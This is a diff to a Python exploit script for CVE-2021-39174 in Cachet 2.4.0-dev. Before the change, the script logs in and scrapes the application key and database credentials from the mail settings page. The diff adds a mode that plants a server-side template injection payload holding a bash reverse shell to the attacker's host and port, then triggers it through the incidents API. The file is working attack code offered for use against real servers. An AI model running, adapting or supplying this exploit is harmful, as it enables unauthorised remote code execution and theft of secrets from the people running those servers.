@@ -1,19 +1,30 @@
 import requests
 import re
 import argparse
+import time
 
 class Catchet():
-    def __init__(self,target,username,password):
+    def __init__(self,target,username,password,key,lhost,lport):
         self.username = username
         self.password = password
+        self.key = key
+        self.lhost = lhost
+        self.lport = lport
         self.login_url = target + "/auth/login"
         self.mail_url = target + "/dashboard/settings/mail"
+        self.template_create_url = target + "/dashboard/templates/create"
+        self.call_ssti_url = target + "/api/v1/incidents"
 
         self.session = requests.Session()
         self.token = self.gettoken()
         self.login()
-        self.exploit()
-        self.extract()
+
+        if args.k:
+            self.create_template()
+            self.call_ssti()
+        else:
+            self.exploit()
+            self.extract()        
     
     def gettoken(self):
         requests.packages.urllib3.disable_warnings()
@@ -60,8 +71,10 @@ class Catchet():
 
     def extract(self):
         requests.packages.urllib3.disable_warnings()
+        print("Waiting 3 seconds: ")
+        time.sleep(3)
         get_data = self.session.get(self.mail_url)
-        print("Getting Data")
+        print("Getting Data:\n")
 
         try:
             app_key = re.findall("&lt;1&gt;(.*)&lt;2&gt",get_data.text)
@@ -77,6 +90,31 @@ class Catchet():
             print("Database Password:",db_password[0])
         except IndexError:
             print("Unable to extract data :(")
+        
+    def create_template(self):
+        requests.packages.urllib3.disable_warnings()
+        print("Creating SSTI Template:")
+        create_data = {
+            "_token":self.token,
+            "name":"hacked",
+            "template":'{{["bash -c \'bash -i >& /dev/tcp/' + self.lhost + '/' + self.lport + ' 0>&1\'"]|filter("system")}}'
+        }
+        self.session.post(self.template_create_url, data=create_data, allow_redirects = False)
+    
+    def call_ssti(self):
+        requests.packages.urllib3.disable_warnings()
+        print("Executing SSTI:")
+        call_data = {
+            "visible":"0",
+            "status":"1",
+            "name":"rse",
+            "template":"hacked"
+        }
+        
+        api_header = {
+            "X-Cachet-Token":self.key
+        }
+        requests.post(self.call_ssti_url,data=call_data,headers=api_header)
 
 if __name__=="__main__":
     print("CVE-2021-39174 Cachet 2.4.0-dev Information Disclosure")
@@ -85,10 +123,13 @@ if __name__=="__main__":
     parser.add_argument('-t', metavar='<Login URL>', help='Target/host URL, E.G: http://cachet.site/', required=True)
     parser.add_argument('-u', metavar='<user>', help='Username', required=True)
     parser.add_argument('-p', metavar='<password>', help="Password", required=True)
+    parser.add_argument('-k', metavar='<API Key>', help='The API Key', required=False)
+    parser.add_argument('-lhost', metavar='<listening host>', help='Your IP Address', required=False)
+    parser.add_argument('-lport', metavar='<listening port>', help='Your Listening Port', required=False)
     args = parser.parse_args()
 
     try:
-        Catchet(args.t,args.u,args.p)
+        Catchet(args.t,args.u,args.p,args.k,args.lhost,args.lport)
     except KeyboardInterrupt:
         print("Bye Bye")
         exit()
